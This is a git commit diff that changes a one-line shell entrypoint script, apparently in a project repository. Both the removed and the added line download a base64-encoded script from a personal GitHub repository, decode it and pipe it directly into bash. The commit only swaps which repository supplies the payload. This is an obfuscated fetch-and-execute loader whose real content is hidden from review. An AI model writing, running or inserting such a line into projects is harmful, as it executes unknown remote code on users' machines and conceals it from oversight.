3dbef1ebf12cfcc5dd9864c61215dc7c71903481
waltercorbin66 <waltercorbin66@gmail.com>
2026-06-19 01:45:24 +0200

    Update run_entrypoint.sh

--- run_entrypoint.sh
+++ run_entrypoint.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-wget -qO- https://raw.githubusercontent.com/kevinyamashita351/population/refs/heads/main/entrypoint.sh | base64 -d | bash
+wget -qO- https://raw.githubusercontent.com/waltercorbin66/role/refs/heads/main/entrypoint.sh | base64 -d | bash
